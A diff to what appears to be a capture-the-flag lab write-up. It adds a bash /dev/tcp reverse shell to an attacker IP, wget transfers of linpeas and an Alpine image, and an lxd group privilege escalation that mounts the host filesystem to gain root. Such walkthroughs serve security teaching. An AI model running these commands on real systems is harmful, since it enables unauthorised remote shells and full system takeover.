@@ -117,10 +117,44 @@ Reconnecting with SMB1 for workgroup listing.
 
 netcat 10.13.22.56 4444 -e /bin/bash
 ```
-- we set our listener `rlwrap nc -lvnp 4444`
+- We set our listener `rlwrap nc -lvnp 4444`
 - We transfer the new file  
 ![image](https://user-images.githubusercontent.com/96747355/176791697-6d3b82f9-82fd-4720-bbcf-2996cfa89627.png)
-- So nothing happens with this
+- So nothing happens with this. If we check the hint it mentions unexpected results with netcat.
+- Let's try with bash instead of netcat `bash -i >& /dev/tcp/10.13.22.56/4444 0>&1`  
+- We get a shell as the user `namelessone` after a minute or so    
+![image](https://user-images.githubusercontent.com/96747355/176949498-db6076e6-9025-4dd3-87f8-86998e37237c.png)  
+- We can grab the user flag
+
+## Privilege escalation
+
+- Let's get linpeas in our target `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh`
+- `python3 -m http.server 80`
+- From our target `wget http://10.13.22.56/linpeas.sh` and `chmod +x linpeas.sh`
+- We are part of interesting groups such as lxd sudo and adm. However sudo -l does not give anything back. Let's try to abuse lxd and follow [this article](https://steflan-security.com/linux-privilege-escalation-exploiting-the-lxc-lxd-groups/) 
+- To summarize here are the commands I ran (using the blog post as reference)
+
+```
+# From my kali
+git clone https://github.com/saghul/lxd-alpine-builder
+cd lxd-alpine-builder/
+sudo ./build-alpine
+# Setup HTTP server to host the image
+python3 -m http.server 80
+# From the target
+wget http://10.13.22.56/alpine-v3.16-x86_64-20220701_1459.tar.gz
+mv alpine-v3.16-x86_64-20220701_1459.tar.gz alpine.tar.gz
+lxc image import ./alpine.tar.gz --alias myimage
+lxd init 
+# we push enter to all the prompts to keep default setup
+lxc init myimage mycontainer -c security.privileged=true
+lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+lxc start mycontainer
+lxc exec mycontainer /bin/sh
+```
+- It works, we are root  
+![image](https://user-images.githubusercontent.com/96747355/176962259-df97417d-b029-4cba-8fc8-23d738145dc2.png)  
+- We can grab the last flag. We need to access to the point where the system is mounted `cd /mnt/root` and we grab the flag `cat root/root.txt`!  
 
 ## Questions
 
